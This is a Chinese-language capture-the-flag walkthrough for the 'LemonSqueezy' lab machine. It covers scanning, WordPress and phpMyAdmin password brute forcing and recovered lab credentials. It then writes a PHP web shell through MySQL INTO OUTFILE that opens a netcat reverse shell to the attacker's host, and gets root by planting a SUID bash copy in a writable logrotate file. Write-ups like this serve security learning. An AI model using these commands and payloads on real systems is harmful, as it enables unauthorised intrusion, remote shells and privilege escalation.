## LemonSqueezy



## 端口扫描

```
开放了80端口，脚本扫描发现了一些目录
/wordpress/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /manual/: Potentially interesting folder

```

 

## web扫描

```shell
# 目录扫描
dirsearch -u "http://192.168.202.131/"
    [19:35:04] 301 -  317B  - /javascript  ->  http://lemonsqueezy/javascript/
    [19:35:14] 301 -  313B  - /manual  ->  http://lemonsqueezy/manual/
    [19:35:14] 200 -  201B  - /manual/index.html
    [19:35:31] 301 -  317B  - /phpmyadmin  ->  http://lemonsqueezy/phpmyadmin/
    [19:35:35] 200 -    3KB - /phpmyadmin/doc/html/index.html
    [19:35:35] 200 -    3KB - /phpmyadmin/
    [19:35:36] 200 -    3KB - /phpmyadmin/index.php
    [19:35:51] 403 -  277B  - /server-status
    [19:35:51] 403 -  277B  - /server-status/
    [19:36:30] 200 -    8MB - /wordpress.tar.gz
    [19:36:31] 200 -    1KB - /wordpress/wp-login.php
    [19:36:31] 200 -   17KB - /wordpress/
    
# 可能的子域名扫描
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://lemonsqueezy" -H "HOST:FUZZ.lemonsqueezy" 


# cms扫描
 wpscan --url "http://192.168.202.131/wordpress/" -e u,vp  
     [i] User(s) Identified:
     
     [+] orange
      | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)

     [+] lemon
      | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      | Confirmed By: Login Error Messages (Aggressive Detection)

# 爆破
wpscan --url "http://192.168.202.131/wordpress" -U user.txt -P /usr/share/wordlist/rockyou.txt


# 得到的凭据
lemon
orange:ginger

# 登录cms后台发现了信息
n0t1n@w0rdl1st!



# 对phpmyadmin爆破
burpsuite配置宏，爆破phpmyadmin后台，用已知的凭据简单组成字典进行尝试

```

![image-20240226181113951](C:\Users\yuhao\AppData\Roaming\Typora\typora-user-images\image-20240226181113951.png)



```
成功得到了phpmyadmin的凭据
```

![image-20240226181303467](C:\Users\yuhao\AppData\Roaming\Typora\typora-user-images\image-20240226181303467.png)

```shell
得到lemon的hash，在本地使用john进行爆破，然后进行在线md5网站进行尝试均失败

## 对mysql进行枚举

show global variables like "%secure%";


```

![image-20240226181759736](C:\Users\yuhao\AppData\Roaming\Typora\typora-user-images\image-20240226181759736.png)

```
尝试写入文件
尝试网站绝对路径

select "<?php system('which nc');?>" into outfile "/var/www/html/wordpress/1.php
select "<?php system('/bin/nc -e /bin/bash 192.168.202.128 4444')?>" into outfile "/var/www/html/wordpress/1.php

本地起监听，成功得到shell

nc -lvnp 4444

```

## 提权

```
执行命令
find / -writables -type f 2>/dev/null | grep -v /proc | grep -v /sys

发现了可写文件/etc/logrotate.d/logrotate
echo "cp /bin/bash /var/www/html/wordpress/xbash;chmod +s /var/www/html/wordpress/xbash" >>/etc/logrotate.d/logrotate

执行定时任务产生的xbash文件
xbash -p

成功得到root

flag ：NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=

```



